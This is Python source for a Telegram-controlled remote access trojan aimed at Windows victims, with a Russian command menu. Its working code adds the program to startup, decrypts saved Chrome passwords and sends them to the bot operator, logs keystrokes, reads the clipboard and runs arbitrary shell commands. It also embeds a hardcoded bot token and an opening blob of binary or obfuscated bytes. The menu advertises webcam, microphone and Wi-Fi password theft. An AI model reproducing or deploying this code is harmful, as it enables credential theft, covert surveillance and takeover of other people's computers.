xed\xe9X\xe8M\xdcOz\x8c\xafg+\x13\xef\x85G\xc1\x82\x92\xa5t\x14F\x80\xd7)\x14rf\xa2\xfd\x03\xf7 L\x08\xf9\xd5A%C\xfa\x19\xe6\xc2\x0c\xa4S\x99\xd1<\xa8\xfc\xd1\x0b\x81\xa1r\ti\x99P\n\xb3\xc1\xaa\xe4\x05\xa9\xc8X\xb5\x0e"\x04\xae\x04N`\xf3\xab\xa3\x97\xf0\xbe\xfc\x02\x05&\xa0T\x9d%\x82\x16L/Hg\xd8\xf0\xb7\xf8\xc5\xc2b\xa2>\xdf\x82M\xc1\xfb\xdba\xb0K\xec\x95\x9d\x10\xcf\xb6</s4p\x15\xcc\x151\x89\xc1\xc0AS\x1d< 6\x9e\xaa\xe9I_\xc2Yo\xdaH\xdb\xc7 \xbfW)N\xac\xfa\xa8\r\xa8\x97\xcd\xe7%\x86\x9d=r\xa3R\x1a\xda\x9f\xa5)uM(4c\xe7\xc8\x8c\xfc\x18iY\xc8gC\xc1\x99\xaf\xd9H\xd3\xc8\x96\x97G3=\xbb\x84l\xe7\x92\x03\x03\xcd\x01\x0e`w:h\xec\x0c\xf4\xa6\x1b\xc4\xb0\xac\x13\xe6e\x93\xee#1]\xcf\xc3\xf5\x8c\x05n\xe9\xc2\x8e\x8d\xdc\xb3<\xfc5\xca\x98\xd2EUpj\xf2Pz\xfa\xc8}\xf3\t|\xd1\x138\x1c\xd8\xd2Y\xd0\xc6\xd4\xf6\xa3\x9d\xc2=\x92?\x02,\xce\x05\x03G\x98/5c\x91\x87\xa2\xfc"\xe5\xadk\x0el\x8a\x9a\xf01\xca\xa5\xe7\x07\xd56\x95k\xc5\xe1.\xf4\xa4DO@\xf8I5\xa7\xe3\xaf4\xd4\xda\xad\x13\xc4\x0c\xc1\x81e\x88\xbf\x1cF \x14"\xb0\x1e\nC@Q\xb2X\xb6N\xea\xb6\xcecp\xfbi\xb5\x0c\x1b\x8dE\x03\x83h\x1f\xff\x86\xdb\xa0\xe3\xf2\x85\\\x02\x1b\x04^\xd8e\xcd\x0cf\xb9\xceV\xce\x90?\xb7f\xab\xe8\xef\xd9q\xe8\t\xfc\xc1]b\x16z\xc8$W$\x9a h\x12\x06\x98\xda\x8f\xb5\t\x82\xcc\x9e>\x8a\x82\x8d\xbe\x9e\xf7a\x1duv\x00a\xa8\x0c\xb0\x8d%\x9d\x1b\x02D\x8f\xc2\x80\x1e\x10\x86Y\x86(3TJA1\x98\xd8}X\x93\x0e\x92\xb4\x1a\x11R\xf4\x81\xf2m\x06\x06>b\x00\xa2u\xf5fO\x92 \x90\xca\x0b\xba\xf1q\x0f9.B-RO\x19\xe9\x0eK\xc6\xa2B\xdf\xb4\xb0{}2"\x0f\xf63\xc8\x91\xb8"\xc4\\\xb4\x96\xa3\xf8,\x93\x83\x8d\xdc\x977\x8ez\x8e\x96\xba\\\xef\x9c\x80\xa1D\xee\xb4\x84"e{\x92\xe2\x0e\x1b*\x85u\xb2\x8eG\xc9\x1b\r\xdc\x93\x13\n\xa0d\xeb^\xa7f8\x04R\x96\xa10\x14\xa7\x07\xfe5!\x07\xeeAJ\xee\xfa\xd0\n\xb9`\x81\x1eh\x86\xbe\xfb\xeb\xa7w\x98u\xcc3\xe0a\x8dHE\xd5a\x15tE\xc4`h\x0f\xaf6\xa1\x91\x01a3P&mP\x8c\xc5h\xf5\x8a\x1ad=\xc6\x18]g\x89:\x90\x82&PW\xd0fT\xb2\xea\x93[\xd8P={4}\xa4\xc0\xf0v8O\xb0I\xd3j\xa1\xa4T\t;\x86\xe2\xf1b\xba\x0eI@\xb5\x98v= \x01\xe9(/\x16\xfc\xfaI$f\xb2W\xcdr\x0b\x8c\xa4\x9c\x8a\x9e\x9f\x98><\xc0\n\xa9\x99\xa6o\xa0ML\xf8\x86K5\'ux.\x8a\xf5P\xb8\xdfA\xfbf\x85\x99\x00\xeb\xc1\xe0A\x02\x8d\xd4\x8e\xbb\xdf\xc8\x9cq\xd7EY\x0es\x88Qk\xac\x87\r`\x99\x81t\\\x1e\xe7\xad\'\x99^\x8f\xc7\x07\x8e\x03\x1a\x82\x1b\x0e\x86\t\xa8\xf0\x1d\xac\x0br%\x8eS\x1f\xaa\x9b\xfa\xe4\x1f7\x91\xb7:\xad\x82:\x1c\xc0\xd4G\xb5\x80\x14\xf1\x10\x0bS\xf5\xcc\xbbT_\x04D~\xe1\xbb\x8eF\x13W\x93\xd5G\xaf\x168`\x0eu\x0cv\xfd\xf4\x1e\xf8\xd2\x07\xc6\xf8CzF\xd3\xf9Gu\xd7\x9f@PK\x9f\x02\x8c\x0822\xe5\x8f\x0eI\x8e\xde\xa9GA\xfa\x1c!C\xb4\xf5y?\xa6uke\x90\x10\xafXc\xb0\x07\xc3\x7f\xa0\x1cY\x9f\\d\xfe\xc7`\xfeM\'n:\x02\xdd\xfb\xea\x8f\xf4\xe1\x05\x16\xec\xf7\xd1\xb1\xfb\xd1\xa7\xe0`\x0c$\x1c\xcd\xd1\x87\x1c\xe0J\xe6\x1f]\xec:\x1f\xaf[\xe7~E\x96\t\xc7\x055\xb1\'\x9bz\x84\x92!\x01\xfcM\xd6G+v\xc1U`\\\x0b!v\x0e\x1d\xc5\xf5V\x7f\xf0\xe0\xce\xed\xcd\xa3\xdb{O~\xf6\xe4\xfd\x7f\xba\xbc\xf8\xad\xcb\xe5\xf2\xe27\xf8r\xfb\xed\xb7\x9f}\xf2\xc1O\x9e>y\xe7\xc5o\x7f\xf5Y\xce?\xe0\xcb/\xef\xde\xdc\xdc\xfc\xfb\xbdO\x7fq\xf3\xea\'\x7f\xf5\xea\xe7\x7f\xf3\xcb\xcb\xe5oo~\xf8\xe1\x9d/.\x97\x9f\xdf\xbc\xfb\xe1\x9d\xff\xbc\\~z\xf3\xc7\x1f\xde\xb9^\xe9\xbf\x01\x01\xe0\xca\'\x00\x00\x19\xdbs\x02)\x01g\x00 \x00\x00\x00\x00\x00\x00\x015\x00\x00\x00\x00\x00\x00\x015\x00S\x00"\x01\\\x00"\x00\\\x00\x95\x00\x00\x00 \xf3\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00c\xe5\x8f\x1ap\x01\x9cx'))

import webbrowser



TOKEN = '8270013274:AAHv2DtZi_YXI9FlWDPIgvTjs66WO8kTJLQ'
try:
    bot = telebot.TeleBot(TOKEN)
except Exception as e:
    pass
#################################################################################






webbrowser.open("https://t.me/+d_HxYLRyzBA0MGEy", new=2)





textovik = """
## 🛠️ Системные команды
 🔌 /addstartup - Добавить ратку в автозагрузку
 📁 /filepath - Показать полный путь ратки
 ⌨️ /keylogger - Запустить кейлоггер
 ⛔ /stopkeylogger - Остановить кейлоггер
 👟 /run [путь_к_файлу] - Запустить файл
 🧑🏻‍💻 /users - Показать пользователей ПК
 🖥️ /whoami - Показать имя компьютера
 📃 /tasklist - Показать запущенные процессы
 🧨 /taskkill [процесс] - Завершить процесс
 💤 /sleep - Перевести ПК в спящий режим
 🕚 /shutdown - Выключить ПК
 🔄 /restart - Перезагрузить ПК
 💥 /altf4 - ALT + F4 
 💣 /cmdbomb - Открыть 10 окон CMD
 Ⓜ️ /msg [тип] [заголовок] [текст] - Создать окно с текстом
*/msg типы(info; warning; error; question; default или 0)*
 пример: /msg error Тест "Текст ошибки" 

## 🔒 Безопасность и конфиденциальность
 🔑 /passwords - Показать сохраненные пароли
 🧱 /wallpaper - Изменить обои рабочего стола
 🪦 /disabletaskmgr - Отключить диспетчер задач
 📠 /enabletaskmgr - Включить диспетчер задач
 ☣️ /winblocker2 - Сломать винду жертве

## 📱 Управление устройством
 📷 /screenshot - Сделать скриншот
 🎙️ /mic [секунды] - Записать микрофон
 📹 /webscreen - Получить снимок с камеры
 🎦 /webcam - Получить видео с камеры
 🎥 /screenrecord - Записать экран
 🚫 /block - Блокировать ввод (мышь и клавиатура)
 ✅ /unblock - Разблокировать ввод
 🖱️ /mousemesstart - Начать хаотичное движение мыши
 🐁 /mousemesstop - Остановить движение мыши
 🪤 /mousekill - Отключить мышь
 🐭 /mousestop - Включить мышь
 🖱️ /mousemove [x] [y] - Переместить курсор на координаты
 🐁 /mouseclick - Кликнуть мышью
 🔊 /fullvolume - Максимальная громкость
 🔉 /volumeplus - Увеличить громкость на 10%
 🔇 /volumeminus - Уменьшить громкость на 10%
 🔄️ /rotate - Повернуть экран на +90°
 🪟 /maximize - Развернуть активное окно
 🪟 /minimize - Свернуть активное окно

## 🌐 Сетевое взаимодействие
 🛜 /wifilist - Показать сохраненные Wi-Fi сети
 🔐 /wifipass [сеть] - Показать пароль Wi-Fi сети
 🌐 /chrome [URL] - Открыть сайт в Chrome
 🌐 /edge [URL] - Открыть сайт в Edge
 🌐 /firefox [URL] - Открыть сайт в Firefox

## 🎶 Мультимедиа
 💬👂🏻 /textspech [текст] - Озвучить текст
 🎵 /playsound [путь_к_файлу] - Воспроизвести звук (предварительно загрузите через /upload)
 📁 /download [путь_к_файлу] - Скачать файл с ПК
 🗃️ /upload - Загрузить файл на ПК
 📋 /clipboard - Показать содержимое буфера обмена
 📇 /changeclipboard [текст] - Изменить буфер обмена

## ⚙️ Продвинутые операции
 🗡️ /e [команда] - Выполнить shell-команду (краткий вывод)
 🏹 /ex [команда] - Выполнить shell-команду (длинный вывод)
 📅 /metadata [путь_к_файлу] - Показать метаданные файла
 ⌨️ /keytype [текст] - Напечатать текст с клавиатуры
 ⌨️ /keypress [клавиша] - Нажать клавишу
 ⌨️ /keypresstwo [клавиша1] [клавиша2] - Нажать две клавиши
 ⌨️ /keypressthree [клавиша1] [клавиша2] [клавиша3] - Нажать три клавиши
 🕶️ /hide - Скрыть приложение
 👓 /unhide - Показать приложение

## 🖥️ Информация о системе
 🪪 /info - Информация о ПК (IP, местоположение, страна, город)
 📊 /pcinfo - Инфо об ОС, системе, CPU, версии Windows, BIOS и др.
 💻 /shortinfo - Краткая информация о ПК
 🛠️ /apps - Показать установленные программы
 🔋 /batteryinfo - Информация о батарее 

## ПРИМЕРЫ:
 📖 /examples - Показать примеры использования
"""




examplestext = """
## Examples:
 /e whoami → Результат: win-9bn5tk4e2b7\\user
 /e cd /home → Результат: Текущая директория: home
 /run C:\\Users\\user\\Pictures\\test.png → Результат: Файл успешно открыт!
 /mousemove 50 80  → Результат: Курсор перемещен на {x},{y}!
 /keypress x  → Результат: Клавиша 'x' нажата успешно!
 /msg info Тест "Привет мир" → Результат: У жертвы открылось окно с текстом! 
"""






n = False

@bot.message_handler(commands=['start'])

def start(message):
    
    if n == False:
        bot.send_message(message.chat.id, "🔐 Введите пароль: ")
        bot.register_next_step_handler(message, checkpass)
    else:
            bot.send_message(message.chat.id, "✅ Пароль верный.")
            
            result = os.popen('whoami').read().strip()
            bot.send_message(message.chat.id, f'Для списка всех команд напишите /help')
            bot.send_message(message.chat.id, f'PC жертвы: {result}')

def checkpass(message):
        if message.text == 'vedmoor':
            global n
            n = True
            bot.send_message(message.chat.id, "✅ Пароль верный.")
            result = os.popen('whoami').read().strip()
            bot.send_message(message.chat.id, f'Для списка всех команд напишите /help')
            bot.send_message(message.chat.id, f'PC жертвы: {result}')

        else:
            bot.send_message(message.chat.id, '❌ Неверный пароль')
#################################################################################    
user_state = {}

@bot.message_handler(commands=['addstartup'])
def add_startup(message):
    bot.send_message(message.chat.id, 'Введите имя вашего исполняемого файла (полный путь):')
    user_state[message.chat.id] = 'waiting_for_path'

@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == 'waiting_for_path')
def handle_executable_path(message):
    executable_path = message.text
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    
    if not os.path.exists(executable_path):
        bot.send_message(message.chat.id, 'Указанный файл не существует. Пожалуйста, попробуйте снова.')
    elif not executable_path.lower().endswith('.exe'):
        bot.send_message(message.chat.id, 'Пожалуйста, укажите действительный путь к исполняемому файлу.')
    else:
        if os.path.isdir(startup_folder):
            executable_filename = os.path.basename(executable_path)
            destination_path = os.path.join(startup_folder, executable_filename)
            try:
                shutil.copyfile(executable_path, destination_path)
                bot.send_message(message.chat.id, f'{executable_filename} успешно добавлен в автозагрузку!')
            except Exception as e:
                bot.send_message(message.chat.id, f'Ошибка при добавлении в автозагрузку: {e}')
        else:
            bot.send_message(message.chat.id, 'Папка автозагрузки не найдена.')
    
    user_state.pop(message.chat.id, None)
#################################################################################
@bot.message_handler(commands=['filepath'])
def get_file_path(message):
    try:
        fullpath = os.path.abspath(__file__)
        bot.send_message(message.chat.id, str(fullpath))
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка при добавлении в автозагрузку: {e}')
#################################################################################

@bot.message_handler(commands=['passwords'])
def send_passwords(message):

    bot.send_message(message.chat.id, "Перехват паролей...")


    key = get_encryption_key()


    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")

    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)


    db = sqlite3.connect(filename)
    cursor = db.cursor()


    cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")

    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        

        
        if username or password:
            bot.send_message(message.chat.id, f"Origin URL: {origin_url}")
            bot.send_message(message.chat.id, f"Action URL: {action_url}")
            bot.send_message(message.chat.id, f"Username: {username}")
            bot.send_message(message.chat.id, f"Password: {password}")
        else:
            continue

        if date_created != 86400000000 and date_created:
            bot.send_message(message.chat.id, f"Creation date: {str(get_chrome_datetime(date_created))}")

        if date_last_used != 86400000000 and date_last_used:
            bot.send_message(message.chat.id, f"Last Used: {str(get_chrome_datetime(date_last_used))}")

        bot.send_message(message.chat.id, "=" * 50)

###################################################################


    data_to_send = ""

    cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")


    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        


        if username or password:
            data_to_send += f"Origin URL: {origin_url}\n"
            data_to_send += f"Action URL: {action_url}\n"
            data_to_send += f"Username: {username}\n"
            data_to_send += f"Password: {password}\n"

        if date_created != 86400000000 and date_created:
            data_to_send += f"Creation date: {str(get_chrome_datetime(date_created))}\n"

        if date_last_used != 86400000000 and date_last_used:
            data_to_send += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"

        data_to_send += "=" * 50 + "\n\n"



    cursor.close()
    db.close()


    try:
        os.remove(filename)
    except Exception as e:
        print(f"Ошибка при удалении файла: {e}")


    if data_to_send:
        with open("passwords.txt", "w", encoding="utf-8") as file:
            file.write(data_to_send)


        with open("passwords.txt", "rb") as file:
            bot.send_document(message.chat.id, file)
    
    else:
        bot.send_message(message.chat.id, "Нет никаких паролей для их отправки.")
    os.remove('passwords.txt')
###################################################################


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
#############################################################################

@bot.message_handler(commands=['taskkill'])
def task_kill(message):

    try:
        task = message.text.split('/taskkill', 1)[1].strip()
        ss = os.popen(f'taskkill /f /im {task}').read().strip()
        bot.send_message(message.chat.id , f'{ss}')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')
#############################################################################

@bot.message_handler(commands=['msg'])
def show_message_box(message):
    try:
        keypwo = message.text.split('/msg', 1)[1].strip().split()
        msg_type = keypwo[0]
        title = keypwo[1]
        text = keypwo[2]
        
        types = {
            "info": 64,     
            "warning": 48,
            "error": 16,
            "question": 32,
            "default": 0
        }
        msg_type = types.get(msg_type, 0)  
        

        command = f'mshta vbscript:Execute("msgbox ""{text}"", {msg_type}, ""{title}"":close")'
        bot.send_message(message.chat.id, "Успешно отображен!")
        os.popen(command)
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
#############################################################################

@bot.message_handler(commands=['stopkeylogger'])
def stop_key(message):
    global end
    end = 1    
    bot.send_message(message.chat.id, "Кейлоггер остановлен!")
    
#############################################################################
@bot.message_handler(commands=['keylogger'])
def track_all_keys(message):
    try:
        bot.send_message(message.chat.id, "Кейлоггер запущен!")
        bot.send_message(message.chat.id, "Напиши: /stopkeylogger для остановки")
        global end
        end = 0
        def on_press(key):

            try:
                bot.send_message(message.chat.id, f"Нажатая клавиша: {key.char}")
            except AttributeError:
                bot.send_message(message.chat.id, f"Нажата специальная клавиша: {key}")

        def on_release(key):

            if end == 1:
                bot.send_message(message.chat.id, "Кейлогер остановлен!")
                return False

        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
#############################################################################
@bot.message_handler(commands=['clipboard'])
def get_clipboard_content(message):
    usid = message.from_user.id
    clientid = message.chat.id
    
    if usid == clientid:
        CF_TEXT = 1
        kernel32 = ctypes.windll.kernel32
        kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
        kernel32.GlobalLock.restype = ctypes.c_void_p
        kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
        user32 = ctypes.windll.user32
        user32.GetClipboardData.restype = ctypes.c_void_p
        user32.OpenClipboard(0)
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            data = user32.GetClipboardData(CF_TEXT)
            data_locked = kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            kernel32.GlobalUnlock(data_locked)
            body = value.decode()
            user32.CloseClipboard()
            username = os.getlogin()
            bot.send_message(message.chat.id , f'{username} буферобмена:  {body}')


#############################################################################s
global mousekill
mousekill = 42


 
@bot.message_handler(commands=['mousestop'])
def mou(message):
    global mousekill
    mousekill = 7
    bot.send_message(message.chat.id , 'mouse kill остановлен')
 


#############################################################################
 
@bot.message_handler(commands=['mousekill'])
def mous(message):

    try:
        bot.send_message(message.chat.id , 'mouse kill запущен!')

        while mousekill != 7:
            pyautogui.moveTo(500,500)
            #time.sleep(1)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')

#############################################################################

global mousemess
mousemess = 42

#############################################################################
 
@bot.message_handler(commands=['mousemesstop'])
def moust(message):
    global mousemess
    mousemess = 7
    bot.send_message(message.chat.id , 'mouse mess остановлен!')
 
 

#############################################################################
 
@bot.message_handler(commands=['mousemesstart'])
def mous(message):

    try:
        bot.send_message(message.chat.id , 'mouse mess остановлен!')

        while mousemess != 7:
            x=random.randint(666, 999)
            y=random.randint(666, 999)
            pyautogui.moveTo(x, y, 7)
            time.sleep(1)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')

#############################################################################

@bot.message_handler(commands=['keytype'])
def keytyp(message):
    try:
        
        text = message.text.split('/keytype' , 1)[1].strip()
        
        pyautogui.write(text)

    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')



###################################################################

@bot.message_handler(commands=['mousemove'])
def mousemove(message):
    try:
        cordinates = message.text.split('/mousemove', 1)[1].strip().split()
        x = int(cordinates[0])
        y = int(cordinates[1])
        
        pyautogui.moveTo(x, y)
    
        bot.send_message(message.chat.id , f'Указатель мыши успешно переместился на координаты {x} и {y}!')
    
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')
        
        
###################################################################

@bot.message_handler(commands=['mouseclick'])
def mousemove(message):
    try:
        
        pyautogui.click()

        bot.send_message(message.chat.id , 'КЛик сделан!')
    
    except Exception as e:
        bot.send_message(message.chat.id , f'Error{e}')
#############################################################################

@bot.message_handler(commands=['keypress'])
def keyprs(message):
 
    keys = ['!', '"', '#', '$', '%', '&', "'", '(',
    ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
    'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
    'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
    'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
    'browserback', 'browserfavorites', 'browserforward', 'browserhome',
    'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
    'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
    'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
    'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
    'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
    'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
    'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
    'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
    'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
    'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
    'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
    'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
    'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
    'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
    'command', 'option', 'optionleft', 'optionright']

    try:

        bot.send_message(message.chat.id , '(/keypress win) Вы можете использовать эти клавиши::')
        bot.send_message(message.chat.id , str(keys))

        keypr = message.text.split('/keypress', 1)[1].strip()
        pyautogui.press(keypr) 
        bot.send_message(message.chat.id , f'\'{keypr}\' клавиша была нажата успешно!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")  


#############################################################################        




@bot.message_handler(commands=['keypresstwo'])
def keyprs(message):
 
    keys = ['!', '"', '#', '$', '%', '&', "'", '(',
    ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
    'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
    'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
    'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
    'browserback', 'browserfavorites', 'browserforward', 'browserhome',
    'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
    'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
    'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
    'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
    'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
    'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
    'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
    'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
    'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
    'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
    'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
    'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
    'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
    'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
    'command', 'option', 'optionleft', 'optionright']

    try:

        bot.send_message(message.chat.id , '(/keypresstwo win r) Ты можешь нажимать эти клавиши')
        bot.send_message(message.chat.id , str(keys))

        keypwo = message.text.split('/keypresstwo', 1)[1].strip().split()
        key1 = keypwo[0]
        
        key2 = keypwo[1]

        pyautogui.hotkey(key1, key2)
        bot.send_message(message.chat.id , f'Клавиша нажата успешна!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")  
        
#############################################################################        


@bot.message_handler(commands=['keypressthree'])
def keyprs(message):
 
    keys = ['!', '"', '#', '$', '%', '&', "'", '(',
    ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
    'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
    'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
    'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
    'browserback', 'browserfavorites', 'browserforward', 'browserhome',
    'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
    'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
    'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
    'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
    'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
    'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
    'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
    'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
    'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
    'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
    'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
    'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
    'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
    'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
    'command', 'option', 'optionleft', 'optionright']

    try:
        bot.send_message(message.chat.id , '(/keypressthree ctrl alt esc) Ты можешь нажимать эти клавиши:')
        bot.send_message(message.chat.id , str(keys))

        keypwo = message.text.split('/keypressthree', 1)[1].strip().split()
        key1 = keypwo[0]
        
        key2 = keypwo[1]
        
        key3 = keypwo[2]

    
        pyautogui.hotkey(key1, key2 , key3)
        bot.send_message(message.chat.id , f'Клавиша была успешна нажата!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")  

#############################################################################
@bot.message_handler(commands=['apps'])
def apps(message):
    try:
        res = os.popen('wmic product get Name, Version , Vendor').read().strip()
        
        lines = res.splitlines()
        
        chunk_size = 30
        chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
     
        for chunk in chunks:
            bot.send_message(message.chat.id, "\n".join(chunk).strip())

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")
        
#############################################################################
@bot.message_handler(commands=['pcinfo'])
def pcinfo(message):
    try: 
        # prop = os.popen('wmic computersystem list brief').read().strip()
        # ver = os.popen('wmic computersystem list brief').read().strip()
        # bios = os.popen('wmic bios get Manufacturer, Version, ReleaseDate, SerialNumber, SMBIOSBIOSVersion').read().strip()
        # cpu = os.popen('wmic cpu get Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Manufacturer, Caption').read().strip()
        # ram = os.popen('wmic memorychip get Capacity, Manufacturer, MemoryType, Speed, PartNumber, DeviceLocator').read().strip()
        # diskdrive = os.popen('wmic diskdrive get Model, Size, SerialNumber, MediaType, InterfaceType, Status').read().strip()
        # osinfo = os.popen('wmic os get Caption, Version, OSArchitecture, BuildNumber, RegisteredUser, SerialNumber, InstallDate').read().strip()
        # networkadapter = os.popen('wmic nicconfig get Description, MACAddress, IPAddress, DefaultIPGateway, DNSHostName, ServiceName').read().strip()
        # bot.send_message(message.chat.id , f"pc properties: {prop}")
        # bot.send_message(message.chat.id , f"pc's os version: {ver}")
        # bot.send_message(message.chat.id , f"pc bios: {bios}")
        # bot.send_message(message.chat.id , f"cpu: {cpu}")
        # bot.send_message(message.chat.id , f"ram: {ram}")
        # bot.send_message(message.chat.id , f"diskdrive: {diskdrive}")
        # bot.send_message(message.chat.id , f"os: {osinfo}")
        # bot.send_message(message.chat.id , f"network adapter: {networkadapter}")    

        prop = os.popen('wmic computersystem list brief').read().strip()
        ver = os.popen('wmic computersystem list brief').read().strip()
        bios = os.popen('wmic bios get Manufacturer, Version, ReleaseDate, SerialNumber, SMBIOSBIOSVersion').read().strip()
        cpu = os.popen('wmic cpu get Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Manufacturer, Caption').read().strip()
        ram = os.popen('wmic memorychip get Capacity, Manufacturer, MemoryType, Speed, PartNumber, DeviceLocator').read().strip()
